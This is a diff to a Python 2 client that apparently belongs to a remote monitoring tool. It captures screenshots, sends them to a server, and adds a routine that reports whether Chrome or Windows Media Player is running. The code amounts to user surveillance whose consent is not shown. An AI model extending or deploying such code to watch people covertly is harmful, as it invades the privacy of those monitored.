@@ -23,6 +23,7 @@ import win32gui
 import time
 from PIL import ImageGrab
 import os
+import httplib
 ###############################
 ########  VARIABLES  ##########
 ###############################
@@ -123,7 +124,16 @@ class Client(object):
         if mass=="image_sent":
             print picname,"sent"
 
-    #----------------------------------------------------------- -------------------------------------------------------
+    #-------------------------------------------------------------------------------------------------------------------
+
+    def Check_Exceptions(self, proc):
+        check=self.CheckifProcess(proc)
+        if check["if open"]==True:
+            self.client.send("Client use "+proc)
+        else: self.client.send("Client don't use "+proc)
+
+    #-------------------------------------------------------------------------------------------------------------------0
+
     def send(self, t):
         i=1
         while(i<=t):
@@ -135,6 +145,8 @@ class Client(object):
         self.running = True
         while self.running:
             try:
+                self.Check_Exceptions("chrome.exe")
+                self.Check_Exceptions("wmplayer.exe")
                 data = self.client.recv(BUFFER)
                 print data
                 if "exe" in data:
